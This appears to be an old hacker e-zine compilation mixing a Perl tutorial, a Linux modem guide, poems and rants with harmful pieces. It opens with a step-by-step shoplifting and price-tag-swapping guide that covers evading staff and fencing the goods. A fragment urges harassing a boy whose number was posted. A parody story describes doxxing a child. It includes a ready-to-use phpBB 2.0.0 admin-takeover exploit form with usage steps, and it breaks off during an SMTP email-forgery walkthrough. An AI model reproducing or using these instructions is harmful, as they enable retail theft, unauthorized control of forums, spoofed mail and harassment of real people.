How To Local Engineer 
---------------------
By: Sandman

Disclaimer: Don't take us seriously..  and don't be stupid.  


This is a doc about how to scam shit up in 'yo hood'.  There are several 
parts to this txt so that i may be 'mo spic-efic' fo each scam. 

Part 1.  DvD / console game "ripping" 

Tools: 	Flat Box Knife - ie. the ones people use in grocery stores, about 
        3 inches long that pop's a standard razor blade's corner out to cut.

        Hook Blades    - Used for cutting and trimming roofing, carpet, 
                         flooring, and cartons without damaging the surfaces 
                         below.

Info:  	The hook lades will not fit into the flat box knife 'without' a 
        little help...... dont make the 'sleeve' for the box blade too big 
        because it will become loose, but a pair of pliers can always help 
        that issue. You dont 100% need the special blades, the others will 
        do, but it's like not neeeeding shoes, shoes are better. 

How to:	This works for any standard dvd type box. If you run into dvd's in 
        the big clear plastic boxes this wont work, but a '5-fingered' 
        opener will or magnet type thing (at hollywood video) will. If you 
        notice the odd bends in the corner that look like a V (the folds 
        part) from the top of the case you can pop the corner into this fold 
        and pull this will cut the bend in the plastic all the way to the 
        bottom and hopefully all the way off. You can then lift the front 
        cover up enough to pop out the disk. Make sure the disk doesnt have a 
        clear plastic coat with 2 metal strips across the disk (block buster). 
        Take the popped box and place it discretely behind the nearest other 
        dvd box. When you go into an establishment it is best to have at least 
        2 people. 1 for watching and 1 for cutting. When you go into the store 
        count the number of workers in the store to better keep tabs on them. 
        If you wear a hat and stand close to the isle you mostly cannot be 
        seen by the cameras if there are any and no one should even notice 
        until you are way gone from the store. The best way to leave is to 
        ask some dumb ass question like "uh do you rent gameboys" and they of 
        course dont so them you must be disappointed and leave. It's best to 
        not take in any personal effects (ie. wallet, id, car keys exc.) just 
        incase they try to get you, your a no body.  Allot of the rental stores 
        will also have preowned or new to sell stuff as well. These items are 
        usually not secure at all or much less secure. BB has preowned's that 
        are highly secured by a sticker I can cut with my thumb nail.

Part 2.	Price Check Please

Tools:  Razor Blade - The utility type, usually rectangle with an 'atomic number 
                      13' rail at the top.
        
        Glue - I had the best luck with 'Quick Tight' super glue, but have 
               considered rubber cement for easy removal. 

Info: 	Usually these items can be obtained from with in the store. Remember you 
        will eventually be caught, dont waste your chances lifting a 1cent razor.

How to:	SKU's		
	Go to any store the uses electronic registers (wal-mart, meijers, target, 
        exc.). Cut the sku off of a much cheaper similar item and glue it over 
        the SKU of your very pricey item. Using this you must use your brain's 
        and have allot of courage. Just remember, the person checking your stuff 
        is some 16 y.o. grocery checking dumb ass. You must try to make it 
        something that either the same thing but cheaper or looks like it could be 
        the same thing. For example: New Nike MJ's... 200$'s... clearance shitty 
        nike's... 20$'s... 'shitty new MJ clearance shoes, 20$'s a savings of 180$'s. 
        Make sure the cashier doesn't know that MJ's are. As far as for cardboard 
        boxed item's, you halft to cut the sku from the box and then place it neatly 
        over the existing sku. this works well if you pick up the cheep item and 
        walk around with it in your cart and then neatly take the sku off.  Then drop 
        off the cheep box and decide on a more expensive box and place it into your 
        cart. Then add the correct amount of glue and stick on the new sku. When 
        checking out, choose the dumbest looking checker (usually the longest line) 
        and go there. If the box is big enough leave it in the cart so they cannot 
        read the sides. then they will use the scan gun to scan it. Do not try this 
        with something that has a serial number for them to scan unless the item 
        that you 'made' it doesnt have a serial number and you can remove the serial 
        number from the outside of the box. If you dont then they will see the serial 
        number and expect to scan it or if it needs one and they do scan it it will 
        come up wrong. There are 2 ways to fence these ill-gotten-gains. The first 
        is to remove the sku you added (easiest with rubber cement) and try to return 
        it to a store that either sells this or the same type of store (k-mart exc.) 
        that you got this from. most of the time with out a receipt they will give 
        you a gift card to spend in the store. The other thing to do is to pawn it 
        or sell it to re-tool or some foo who wants it. if you pawn it, ensure you 
        are 'not you' and the 'not you' has owned it for like 6 months or something. 
        Also you can just swap the box of what you want for the one you want to pay 
        for. 
 
	The only other way I can say to do a price change good is to go to a place 
        that has only the old school registers like hobby lobby. They use a red felt 
        tip pin to mark across the original tag and then pull a tag off of a on sale 
        item and place it onto you not on sale item.

After I posted his number on my website, I guess he now gets
a shit load of calls a day. And I heard one story about how
Blaine got grounded because someone socialed his parents into
thinking that he was an "AOL Hax0r." If you hit this kid, let
me know what you did to him, and how he reacted.

The art of perl v0.1 
by buffer0verflow. 

In this paper I will try to explain the basics of perl, and why
I think its so popular. By the end of this paper the reader should
have a basic understanding of perl's data types, minimal regex, 
and perl syntax. At the end of the paper I will write a demonstration 
program, To put it all together.

1. What is perl?

   Perl is a interpreted programming language. Perl stands for 
Practical Extraction and Report Language, a.k.a. Pathologically 
Eclectic Rubbish Lister. Perl was developed by Larry wall.It includes 
many facilities reminiscent of awk. It is considered by sys-admins to be the 
language of choice. Why? probably cause it can interact easily with
the system. And deals well with text, and many other things.
As my friend once put it, "Perl is like a hamster with a swiss army knife."
Perl was also gonna be named after Larry's wife. Then he decided against it. And
moved onto the name 'Pearl' which was a no-go due to there being another
language named pearl. So he chose perl. 

2. Why its popularity?


   Alot of perl's popularity comes from the way it can handle text. Perl 
deals with text excellently. I don't think there is a language that can 
match perl's text capabilities. Another reason is it allows you to be sort of
apathetic with your code. Perl is a pretty loosely typed language. It doesn't
hold back much. It does what you tell it to do. Even if it doesn't like it.
As I said before it deals with text excellently as you will later see. So 
sys-admins enjoy being able to parse through log files, and taking out the data
they want. And leaving the data they don't need. Another reason, is it has a
smooth learning curve. You can learn just the minimal basics and still be able
to produce some useful programs.

3. Now onto the basics of the language. 


   Now we'll get into the basics of perl. Alot of people say they can tell alot
from the language by seeing how simple the hello world looks. Well in perl
I don't think it gets any easier. Here is the hello world in perl:

#!/usr/bin/perl
print "Hello World\n"; 

The '\n' of course means to skip to the next line. Just like in many other 
languages. The first line sometimes referred to as the shebang line. Just makes
it so you don't have to type perl hello.pl. You can just type the name of the
file:

#./hello

 of course it has to have execute permissions. Next we will deal with 
some data types. There is really only 4 basic types they go as follows:

$string = "l33t"; # A string.
$num = 1337;  # A number notice they can each use the '$'
@array = (10, 12, 12); # an @rray. 

%hash = (
age => 18,
name => "Harry",
);               # this is a hash which i will explain in a sec.

Perl has the data type hash. Which is sort of like a structure of data.
Accept it uses 'keys' to access the data. So say we wanted to get the 
value of what 'age' holds. We do that as follows:

print $hash{age}; # would print '18'. 
$age = $hash{age}; # or we could store its value in the variable $age.

Notice we used % when declaring our hash. But when you access it you use 
$hash{keyhere} its the same with arrays. As so:

@array = (10, 20, 30, 40); 

print $array[0]; # prints the first value of the array '10'.

Remember the array's subscript (value) starts at 0 and goes up. Not 1. 
You could also print the whole array if you wanted. As so:

print @array; # prints all the values in the array all together. 

We could make that look cleaner alot of ways. Perl has a foreach control 
statement. We could do:

foreach $value (@array) {
print ("$value\n");
}

Which loops through the array and stores each value in the scalar variable
$value. Now we'll go on to some user-defined functions. A function is just
a piece of code that usually has a specific job, like adding up variables
passed to it etc. You declare a function with the sub keyword as follows:

sub add {

return $a + $b;

}

That returns one value, which would be whatever is in $a + whatever is in $b.
Full example:

$a = 10; 
$b = 20; 
$c = add($a, $b);
print("\$c holds the value $c now\n");  
sub add {
return $a + $b; 

}

The \ is for telling perl we want to print the $ symbol so we don't get it
confused with the actual value in the variable. You can pass multiple things
to functions, and perl can handle it pretty well. As long as the code deals 
with the variables correctly. And you might have noticed perl doesn't care
when you declare variables. Like in some other languages you have to initialize
 them before their used. Perl don't care. Unless of course you tell it to.
we can do that as so:

use strict; 
my($a, $b); 
$a = 12; 
$b = 12; 
print("$a $b\n"); 

The use strict in the top of the code, puts the strict module into play. 
Which means we have to declare all of our variables before using them. 
The advantages are the code tends to run faster with strict. Disadvantanges
It kind of bites declaring them before we use them. But its a good idea to use 
them. The my() function is used to declare your variables. The use functions
puts the given module into play, in our case strict. But there are literally
thousands of different modules out there. Some include Net::IRC, IO::Socket; 
CWD, and many others. 

Now its time for some simple regex. Regular expressions. Are useful for finding
patterns in text, strings. Even from sockets. To show a brief example:

$string = "Where the hell is the cake";
if($string =~ /cake/i) {
print("Found..\n");
}

else {
print("I didn't find it..\n");
}

Running that program will print Found.. since 'cake' is contained in the string.the ~
 is a regex pattern telling perl we want to search for something /cake/
is the pattern telling perl we want to search for 'cake', and the i means 
ignore case. So, if it was say CAKE, or Cake, it will still match it since it
ignores the case of the word. You can see how useful regex'es can be. Say
we had a file, we wanted to find a pattern in it. Regex's would do the job.
To sum it up we'll write a program called 'parse'. Which will take a specified
pattern, and search for all occurences, and 'parse'(remove) it from the file.
This can be useful. Say your on IRC and someone pastes you some code you want
to run. Of course the <nickname> stuff will be in there. And it would be
very time consuming to go through and delete each manually. So we'll
throw that data into a file, tell perl to open it up, find the pattern, and 
remove the pattern if it finds it. The code goes as follows. I will explain
it in detail afterwords.

# parse.pl 

$file = shift;
$pattern = shift;
$file2 = "parsedata.txt"
die("usage: <file> <pattern>\n") unless defined($file) && defined($pattern);
open(FILE, "$file") or die("Cannot open file\n");
open(FINAL, "$file2") or die("Can't open");
@arr = <FILE>;
foreach $line(@arr) {
    if($line =~ /$pattern/i) {
     $parsd = (split(/$pattern/, $line))[1];
     
        print FINAL $parsd;
    }

}

close FINAL;
close FILE;
print("New parsed data is in $file2\n");
$time = localtime();
print("Completed on $time\n");

And thats it. We'll start at the beginning $file = shift. This tells perl to get
the file name on the command line. ie: when the program is being ran.
Same goes for $pattern. If those values aren't defined the program will die
printing the usage. A few new keywords were used. unless is another control 
structure which is pretty self-explanatory. defined() takes a value as its 
arguments. If its not defined then it will do as told. In our case die.
die() is basically a function to signal an error. If the values are defined
it moves on and opens the $file specified. If there is a problem opening it
it will die. If all goes well it moves on. The @arr = <FILE>; stores all the 
data in the file into the array. Then we move on to the foreach it says.
for each line in the array search for the specified pattern is the pattern exists 
parse it out uses the split function. which removes the $pattern. 
Then it prints the parsed information into $file2 which will contain what we want.
Then it closes both of the files. and tells us the new data is in file2. 
Then a pointless addition $time = localtime(). The localtime() function is also
pretty self-explanatory. Then it tells us its done. That's that. The program 
should work on any platform. Perl is very portable. The program could have been
done in various ways. Perl uses the TIMTOWTDI attitude. There is more than one
way to do it.

5. Summary. 


   Hopefully you gained something from this tutorial. If not, I am a loser, and
should be shot with a 9. If you have any questions, comments or whatever, you
can email me at joey@hackernetwork.com. You can also find me on irc. The next perl
tutorial will contain more advanced information with a demonstration on sockets.
We'll be creating a simple IRC bot. That's all for now. Peace.

Linux PCI Modems: The Myth Is Broken
====================================
By: Magickal1

I have seen many pages written for the modem and its installation but 
they mainly cover the ISA modems. This is for the PCI Modem. Now if you 
are looking here because have a Win-modem I'm sorry, But I cant help you.
Because todays machines are using PCI boards and ISA is a thing of the 
past, I have written this in hopes of helping a few souls out their that 
need it. I know that High-Speed access is the rage, and many think that 
OMG your still on a Dialup, get High Speed Access (HSA). Well this is not 
an option for many so the tried and true modem is the only way.

Most other tutorials will tell you that PCI wont work. Wrong! There 
are several True modems out there that do. The Action-Tec Call Waiting 
Modem and the US Robotics 56k PCI Modem are 2 that I have used personally 
that work just great. With that said, the following instructions are based 
on those 2 modems.
 
The best thing to do is to read the box that the modem comes in to make 
sure that it's NOT a Modem-Emulator or the so-called Win-modem. On to the 
Nitty-Gritty.
 
It is assumed that you have already installed the hardware as this 
paper is not intended as to tell you how to do that. It is also assumed 
that your Kernel has serial support, and PPPD as well as a communication 
program such as Mini-com
 
Log onto Linux and start a terminal session and SU as root
 
The modem is going to be configured based on the following files that 
are assumed to be on the system
 dev/ttySx or dev/cuax 

 If by chance they are not there you can add them by this command:
 cd dev
 ./MAKEDEV ttySx (x=port number) ie: ./makedev ttsS4
 
on open Linux there is no make DEV so the command is:
 mknod /dev/ttyS4 c 4 68
 mknod/dev/tcua4 c 5 60
 (note that in kernels 2.2.x and later the cuax have been depricated)
 
Next step is to create a few symbolic links
 
ln -s /dev/ttyS4 /dev/modem (this creates a symbolic link from the dev 
ttyS4 to dev modem)
 chmod 666 /dev/ttyS4
 chmod 666 /dev/modem
 
Now lets determine what communications port the modem is on
 cat /proc/pci
 
Look at the output and find the modem
 you might see something like this: 

 Bus 1, device 8, function 0:
 Serial controller: US Robotics/3Com 56K FaxModem Model 5610 (rev 1).
 IRQ 10.
 I/O at 0xecb8 [0xecbf].
 
Write down the first input/output (I/O) and the IRQ 
now type in this command:
 setserial /dev/modem uart 16550a port <your value> irq <your value>
 
now try it out in mini-com. If it worked add the above command to the 
following file two times. as such:
 
in the file /etc/rc.d at the last line
 setserial /dev/modem uart 16550a port <your value> irq <your value>
 setserial /dev/modem uart 16550a port <your value> irq <your value>
 
This will insure that the modem is set every time that you boot!
 
Now lets set up the PPP
 
Is assumed that you have an ISP and valid account
 
You will need:
 - User name (login) and password
 - The Dial up Telephone number
 - The IP address that's been assigned (this doesn't apply if your ISP uses 
   a Dynamic IP as Most Do)
 - The Dynamic Name Server (DNS) addresses (you need at least one I order 
to translate from URL names like www.antionline.com to the IPV4 IPV6 URL)
 
PPP comes with some scripts that are already made that just need to be 
edited and moved a bit. You can find them on MOST systems at
 /usr/share/doc/ppp-2.x.x (depending on you version of ppp)
 
Type in the following editing to fit your system
 
cp /usr/share/doc/ppp-2.4.1/scripts/ppp-* /etc/ppp
 
Now cd to the /etc/ppp dir and open up in a text editor the following 
file.
 
ppp-on
 
Make the changes in the username password telephone numbers and such
also at the bottom of the file change the line that read /dev/ttyS0 
to the tty that you system uses change the value 38400 to 115200. Save 
and close
 
Open up the ppp-on-dialer in an editor
 
Change the setting after TIMEOUT from 30 to 60
 Change the line that reads
 exec chat -v to
 exec /usr/sbin/chat -v
 save and close
 
Open up /etc/ppp/options and make SURE that there is a line that says 
LOCK This prevents other processes from accessing the modem while in use. 
Save and Close
 
Now lets set the permissions
 
Make sure that your in /etc/ppp as root 
Set the permissions for the scripts as follows
 
chmod +x ppp-o*
 
Now the password is stored Unencrypted (yeah, I know that's not the best 
way, but hey, it works) so we are going to se the permissions on that file 
to 711 (read/write/execute) for the owner and execute-only for everyone 
else.
 
chmod 711 ppp-on
 chown root ppp-on
 chgrp root ppp-on
 
now open up /etc/resolv.conf and add in the DNS address that was 
provided by your ISP
 
Let's make another Symbolic link for the scripts
 
ln -s /etc/ppp/ppp-off
 ln -s /etc/ppp/ppp-off
 
Thing should be up and working
 
If you use a GUI Like X-server and KDE or GNOME you can edit the dialup 
programs from the GUI interface and in a few moments be surfing the net 
to you hearts delight.
 
Note in KDE KPPP doesn't have an entry for DEV above ttyS3 so make sure 
that you use /dev/modem as we have already set the link for it
 
Hoped this helped and happy surfing.

The following was written under the influence of the BOFH (Bastard 
Operator From Hell) series of text files, written Circa.1980, about (yes 
you guessed it) ..... a Bastard Operator From Hell. In this installment it
seems the BOFH got laid and has produced an offspring .... The Bastard
Admin From Hell, read on ........

Bastard Admin From Hell here, its monday, shit WILL happen.

I get in early so I can replace NT with Windows 3.1 on all the 
machines. Should cause some interesting compatibility issues. Then I set up 
the proxy account to run all internet traffic through the teachers demo 
computer instead of our very expensive dedicated internet server, and go to 
sleep in the office.

The phone rings, its the new IT teacher.

"Yes?" I answer irratably.
"Er, my internet connection is running really slowly, do you know why?"
I don't bother with the excuse cards.
"Aren't you the teacher?"
"Well yes but..."
"Then shouldn't you know?"
"Look, who do you think..."
"Shut up. Just exit Internet Explorer (suckers), wait 10 seconds and
then it should be fine"

I quickly open his account, change his homepage to www.harcoresailors.com
and go back to sleep. 5 seconds later I hear a whole class of students
jeering very loudly. What a bastard I am, and its not even 10 yet.

I get about 2 hours of shut eye before the phone rings again. Its a 
user, he wants to know why the IT room door is locked. I didn't know it was 
but I tell him thats its to protect the hub from transgressional static
magnification. He seems to accept it and I hang up.

I open the IT room at lunchtime because I had slept enough and reading 
other people's email was getting boring. I echo a user's machine. Playing an
online RPG, the thing I hate most. The biggest waste of bandwidth since 
AOL. I take control of his computer, type www.lolitasex.com into his address 
bar and freeze the machine once the front page has loaded. I call the 
manager and tell him to check machine 12, the machine I took over. From my 
desk I hear a lot of shouting in the next room, the guy was expelled the next 
day. Life's tough isn't it. I take the phone off the hook.

After using almost the entirity of the school's bandwidth to host a 128 
player Unreal Tournament game for a few hours I get bored and nuke all the 
players with an open port. Well, like I always say, you should never trust a 
sysop running a 128 player game of UT. I decide to play the 'Chinese "And 
Then" Mind Game' and put the phone back on the hook. It takes less than 30 
seconds for it to ring. Its a user.

"Er, I have a problem, my terminal has totally frozen up and I have really
important work that I hasn't saved"
"And then?" is my only response. The user seems slightly thrown.
"Er, well I tried to open the task manager"
"And then?" I reply again.
"Well, er, nothing"
"And then?"
"Um, and then I called you"
"And then?"
"Uh, nothing"
"And then?"
"Is this a joke?"
"And then?"
"And then nothing!"
"And then?"

He hangs up, I check my watch, 20 seconds. Not bad, must try harder 
next time. I trace the call, find out his username and e-mail him a list of 
IT rules with one addition. 'Rudeness to any member of the IT staff will 
result in immediate exclusion from the network.' I echo his terminal and let 
him read the e-mail before deleting his account. Lunchtime.

I stroll back into my office just in time for the last computing class of 
the day. I check the lesson roster and find out, much to my amusement, that
Mr.Hardcore-Sailor is teaching a load of first years on "how to use the
system", God I love the beginning of the year, so many innocent victims.

I hide my computer off the network and open up CMD.EXE. I crack my 
knuckles, time to have some fun! I ponder on the best plan of attack, a 
stroke of genius hits me as I pull down the password list for that class. 
It seems one of them has set his password as "l33thaxx0r", hmm, I think we 
have a target. I feed him a dummy FBI login page and echo his terminal, lets 
see what he does.

After a pause of a few seconds i get a "HELP LOGON" message tentatively 
crawl across my screen. I use NET SEND to send him a little message: 
"UNAUTHORISED ACCESS DETECTED, TRACE COMMENCING". The kid closes the message 
very fast and the dummy screen even faster, no doubt hes panicking. I watch 
as he pulls up explorer and heads straight for the SYSTEM32 folder, no doubt 
he's going for CMD.EXE to delete himself off the network. I at least let him 
open the program before I kill the connection between his keyboard and his 
terminal.I send him another message: "CONNECTION IDENTIFIED ..... LOCATION: 
LONDON, ENGLAND". I know all the kid can do is sit and watch as I continue 
(what a shit I am).

"USER: BETTSM PWORD: L33THAXX0R ADDRESS: 51 UNION ROAD, CLAPHAM, 
LONDON"

That does it. I hear a door open in the classroom and the sound of an 
twelve year old boy crying and shitting his pants as he runs from the IT 
centre. I delete his account, I doubt he'll ever be back.




Well that concludes this episode of BAFH but if you liked it let me 
know and I might write another few. I can't take any of the credit for 
such a great concept as this and all credit goes to Simon Travaglia, 
who wrote the original series, Bastard Operator From Hell, which you

Want admin on phpBB 2.0.0?
--------------------------

PhpBB is a popular free bulletin board package available at phpbb.com, 
which google reports as having 100+ implementations at the time of 
writing this article.

A coding error exists in the admin_ug_auth.php script (used to set 
permissions), which means that although admin rights are needed to view the 
page, anyone can post data back to it îno questions askedî.  Therefore, 
if you already know what kind of response the board is looking for, you 
can go straight ahead and tell it directly that you want to give admin 
rights to a specific account.  If you do not already have an account on 
the board in question, you will have to create one.

One way to test this would be to set up a board yourself, (which you 
have admin rights over) and edit a copy of the form used to update 
permissions, but for people who donít want to goto those lengths, Iíve 
provided some sample code below:

<html>
<head>
</head>
<body>

<form method="post" 
action="http://www.domain_name/board_directory/admin/admin_ug_auth.php">
User Level: <select name="userlevel">
<option value="admin">Administrator</option>
<option value="user">User</option></select>
<input type="hidden" name="private[1]" value="0">
<input type="hidden" name="moderator[1]" value="0">
<input type="hidden" name="mode" value="user">
<input type="hidden" name="adv" value="">
User Number: <input type="text" name="u" size="5">
<input type="submit" name="submit" value="Submit">

</form>
</body>
</html>

Before using the sample code you must first find out two bits of 
information which are both easily obtained.  The base directory of the board, 
(usually something like http://www.mydomain.com/phpBB2), which is found 
by taking off index.php from the main page URL, and the user number of 
the account you wish to give admin.  To do this go to the forums member 
list page, click your username, then note down the number shown at the 
right end of the URL you are now at.  (if no users have been deleted 
from the board, then the number next to your username on the members list 
page under the ì#î column will also be your true user number, but play 
it safe and use the one in the URL).  When you have all the 
information, ensure you log out from the board.  (otherwise, you will get a 
permissions error later on, as StankDawg discovered).

Now edit the form action in the sample code above to be the full 
location of the boards base directory plus the location of the admin script.  
Usually, this is in a subdirectory from the base directory called 
/admin/.  Your result should look something like this: 
action=http://www.domain_name/board_directory/admin/admin_ug_auth.php. Save 
the changes to your page when you are done.  

Next just call it in a local browser window, typing the user number you 
obtained into the user number box on screen, and hit submit.  On your 
next log in, there will be a link at the bottom of every board page 
saying "Go to Administration Panel" and additional options will appear on 
screen when you are viewing a specific thread to enable you to edit, 
delete, lock individual posts/threads etc.

Basic Directory Transversal

By:  StankDawg@hotmail.com

http://www.StankDawg.com/


When digging into a system it is always smart to look for obvious lack of 
security instead of looking at holes within the security.  In other words, 
if you want to poke around a system, look for the obvious, visible openings 
before engaging in actually attacking the security of the system.  I look at 
this as being given access instead of gaining unauthorized access, which 
legally, is a big difference.  Now I am not a lawyer, but these are two 
completely different things in my mind.

Basic directory transversal involves seeing what directories are publicly 
accessible without "breaking into" anything.  More advanced forms of directory 
transversal involve using these basic principles to slide through security by
using things like "/../" and hex codes to try and fool the software into 
allowing you access to directories that were not intended to be accessible.  
But letís stick to the basics for now.  For example, depending on the type of
web server running, you are probably familiar with the fact that there is a 
specific default directory structure that usually contains at least one 
subfolder called "images."  No HTML is usually stored in this directory, but 
there are images there.  If the privileges are not set up properly, you can 
browse to the images directory and see all of the files contains within.

Take this one step further and see what other directories you can get into.  
You might find directories called "content," "templates," "members," or 
pretty much anything.  Each one of these folders should be locked down to 
prevent unauthorized access.  The sad reality is that they are not.  During 
your normal browsing of a site, or your intentional targeting of a site, 
notice the directory structure of the site.  Notice that you may suddenly 
jump two directories deep.  You may click on a link from the main page to a 
page located at "../content/articles/page1.html."  Notice that you are 
entirely bypassing a directory.  It is usually these directories that are 
nsecured.  Either the administrators are too lazy to lock that directory 
down, or they donít even realize that it is publicly accessible.  Even though 
there is no link to it, simply navigate to that directory and see if there 
is anything there.  You may be surprised at what you find.

From this point, you should look for a pattern.  Is everything else also 
stored in subdirectories beneath the "content" directory?  If it is open, 
you will see the list of files and subdirectories.  They may not be listed 
on the home page, or linked to from any other page on the entire site.  
They may be pages that are under construction, or pages that have been 
removed for one reason or another (when I say removed, I mean that the links 
were removed, but obviously the pages may still exist).  Sometimes you may 
find "objectionable content" that was removed by request.  Frequently you 
will find the new updated home page in a subdirectory just waiting to be 
moved into the root directory.  The really fun stuff is finding a "secret" 
page that some 31337 h4x0r has "hidden" on his site that only friends are 
supposed to know about, or a page that is under construction and was not 
intended to be available yet.  I have, on many occasions, had accounts 
removed for turning in a prize claim or contest entry before the page has 
been released!

There is a lot that you can do to find the directory structure of the site, 
and I will leave that for a future article if there is interest.  I find this 
style of hacking particularly interesting because it sits in that "grey area" 
between publicly available and "breaking-and-entering."  Again, I do not know 
the law, but I am sure it sides with the companies who own the sites.  If we 
access a page or a directory that is publicly accessible or available (as long 
as you know where to look) could we (and should we) be prosecuted?  Were any 
laws technically or even ethically broken?  Is this entrapment?  Or are we 
just giving lazy incompetent administrators free run to perpetuate insufficient 
security by their own lack of ability?  I think that if something is so 
important that you donít want it out on the internet, then donít put it on a 
server without adequate protection.  If you do, I think you as an administrator 
should be held responsible.  Isnít it hypocrisy to punish hackers for accessing 
a file yet not punishing the host for releasing the file?  They should be held 
accountable for their mistakes instead of blaming the hackers.  If we have the 
potential to go to jail, so should they.

A small look at Xbox LIVE

By: Turbanator
--------------------------------------------------------------------------

  When Microsoft first released details about their new online gaming 
service for the Xbox, people were skeptical.  "Do I have to give out a 
credit card over my console?", "Will my information be hacked?", and 
"Where does this information go?" were just some of the questions people 
asked about the service.  Microsoft responded that they have "Military 
Grade encryption" with the Xbox LIVE service, and I recently found out 
how close that is to the truth.

  Now, I dont know alot about encryption, so pardon me if I get 
something wrong.  I originally sought out to "hack" into the Microsoft servers 
to get into Xbox LIVE account, but found out that it was impossible.  
Why?  Because the packets of data sent between an Xbox and the LIVE 
server are UDP, which cannot be connected to, BUT, they can be intercepted 
>:]

  I managed to capture about 5 minutes worth of activity on the Xbox 
LIVE service, all of which I will not display here.  But I will point out 
some things that caught my eye.

  In this log, you can clearly see that the communication between my 
xbox, and the live server, change ports frequently (and this is about 10 
seconds worth of activity!).

21:39:22.087612 IP turbanator.3074 > 207.46.246.6.3074: udp 1404
21:39:22.176623 IP 207.46.246.6.3074 > turbanator.3074: udp 795
21:39:22.201939 IP turbanator.3074 > 207.46.246.6.3074: udp 320
21:39:22.275442 IP 207.46.246.6.3074 > turbanator.3074: udp 24
21:39:22.341035 IP turbanator.3074 > 207.46.246.6.3074: udp 36
21:39:22.415943 IP 207.46.246.6.3074 > turbanator.3074: udp 36
21:39:22.416038 IP turbanator.3074 > 207.46.246.6.3074: udp 32
21:39:22.469919 IP turbanator.3074 > 207.46.246.6.3074: udp 224

  So what Microsoft said about "Military Grade encryption" is somewhat 
true, though im not an encryption expert, so I dont know if the packets 
are encrypted or not.  Its also a good idea to have the ports change 
constantly, and to have them UDP, so no one can connect to the server.  
I've also noticed that Xbox LIVE never uses the same server when it logs 
on, it switches everytime you log out of the service.  This is also a 
good security measure.  If one day the Xbox LIVE service is infact 
cracked one day, it will be intresting to see how its done, because it would 
take alot!

  BIG thanks to dropcode for helping me with the packet interception! 
:)

Welcome to GPC's poetry corner where I enderver to show the effects of 
too much thought and not enough sleep / drugs. Here's a vaguely technology 
related poem although obviously, its open to interpretation, email me if you 
think it means something (or anything), it wud be interesting to hear.

Data spirals forever,
Ever increasing,
Ever frustrating,
Internal errors,
Fuck with the minds,
Of those not,
Plugged in.
Watch the blue bar,
It almost made it,
That time.
Fatal errors,
Of our minds.
Don't connect,
Don't give in,
It'll kill you.

Well there you go, it has no title and it has weird meaning but hey, 
you get what you pay for. Hmm, i think I'll give you another one actually, 
this, like the other one has no title but you might like it (if there's still 
anyone reading....)

My own little world,
The world being mine that I own.
All alone,
Lonely in this world.
Come join me,
Room for two.
There being room for two,
So we sat.
The type of sitting,
One would call standing,
If one lived,
In any other world.
Of course I'm bored.
The world being mine that I own,
My own little world.

Well there you go, email me at heelflip_the_biscuit_tin@hotmail.com if 
you have anything to say or even if you're just still reading this.

For the simple minded that want to hack your ISP and hotmail accounts 
here is the answer you have been waiting for.

You see it every single day.... " Hey can someone tell me how to hack a 
hotmail account " or the one with more balls " Hey how do I hack my ISP ", 
then you wonder, can America's youth and their knowledge of the Internet 
really be so blind? After seeing these questions day in and day out in 
channels on dalnet that I chat in.... its come to my attention that, YES 
the majority of the people out there that get in to this whole concept 
called " hacking " (which has become such a stained word that I hate ever 
fucking using it anymore) are completely blind to it and think that they 
can " hack " anything by joining a channel on their favorite IRC network 
called hack, hacking, or something of the sort and expect to get actual 
simple answers to their retarded and sometimes ridiculous questions. Just 
think about it for more then 5 seconds which is hard for most of the wasted 
young minds out there and you will realize that if it was as easy as just 
asking some random person in a hacking channel how to hack/crack your 
own ISP then wouldn't it be done on a daily base? And wouldn't your ISP be 
going down on a daily base? Or maybe that your ISP actually hire 
professionals that get paid more money then your entire family combined to 
stop people like you and that they might actually be doing a damned good job? 
I mean I'm not saying it's impossible because it's far from that but if any 
thought at all was put in to this concept by the average person he should 
come to a conclusion that this task would be a very hard to accomplish and 
almost impossible feat that would take many years of learning every loop 
hole and exploit and every OS that your ISP could own and then on top of 
that knowing more about your ISP then the CTO and all his workers know 
combines about there own system. But no we have these simple-minded, usually 
young people that can be using their age to learn and make the Internet 
stronger and eventually gaining new concepts that they could spread to more 
people online to better the Internet and the security issues out there, 
wasting it all and simply asking these stupid questions hoping for a easy 
method that they can point click and kill their ISP then spread the word to 
their best bud to look like some hardass hacker that took his whole ISP down. 
I mean seriously WHAT THE FUCK were you thinking when you even came up with 
the idea to take down such a powerful company (not in all cases ). It's very 
sad, I hope that people that ask these questions are reading this, those fools
who join those hacking channels and ask this retarded shit get some sort 
of idea of what I'm talking about. Even though I doubt this will solve any 
problems with it but if it can even stop one person and make him think of 
learning on his own a bit and to stop asking these stupid questions and 
actually trying to figure out why it would never work then I have done my job.

E-Mail Forgery
 
By:  Bi0s - (bi0s@StankDawg.com)

Want to know how to forge an e-mail?  Want to send an e-mail to a friend with a fake 
address such as: "bush@whitehouse.gov"?  It sounds tough doesnít it?  Itís really a lot 
easier than youíd think.  This is actually a pretty old trick, but I thought some "new to the 
scene" hackers would like it.  It is important to understanding email fundamentals if 
nothing else.  First of all, will you need any special software for this? Are any special 
skills needed?  Well, not really.  If you can use telnet, you can do this.  Telnet is a client 
you can use to make a connection to a remote computer as though you were signed on 
locally.  This is a default tool included with Windows and most Linux distros.

Things to keep in mind:

Nowadays, everyone is worried about security.  So, a lot of the mail servers you will run 
into will force you to login.  However some are still wide open!  Not all these servers are 
locked up.  Some system admins just donít know, or just donít care about this.  This is 
usually most prevalent in schools and universities who tend not to update as often as 
others.  Sometimes, it is not locked up and it wonít even ask you for a login.  Also keep 
in mind that the server most likely is recording everything you do.  Most of the time, the 
mail server prints to a log file.  So, you may not want to do this from home.  Also, even 
though the e-mail has a forged name.  If the target is smart enough, they can just look at 
the header from the e-mail and determine what server the mail came from.  As the IP 
address will be in the header.  This can be circumvented by learning more of the SMTP 
commands and routing your email through a proxy server.

On to the Hacking:

A lot of webservers use Sendmail as their mail server.  SMTP (simple mail transfer 
protocol) is the protocol it uses.  All this does is take care of the commands needed to 
send mail.  Usually a mail server can be found on port 25.  So for example, if we wanted 
to use the mail server at stankdawg.com, we would open up telnet, set the hostname to 
stankdawg.com (usually by issuing the "open" command), and then set the port to 25. 
Now connect.

When you first get there, you should see something like this:

---
220 stankdawg.com ESMTP Sendmail 8.12.5/8.12.5; Thu, 14 Nov 2002 18:39
:56 -0500
---

It wonít do much else.  Itís sitting there waiting for your commands.  Go ahead, talk to it.
The next step is to well, say "HI" to the server.  And it will respond to you. Type:   
"HELO  stankdawg.com" and watch what happens.

---
HELO stankdawg.com
250 stankdawg.com Hello yourhostname.net [your IP here], pleased to meet you
---

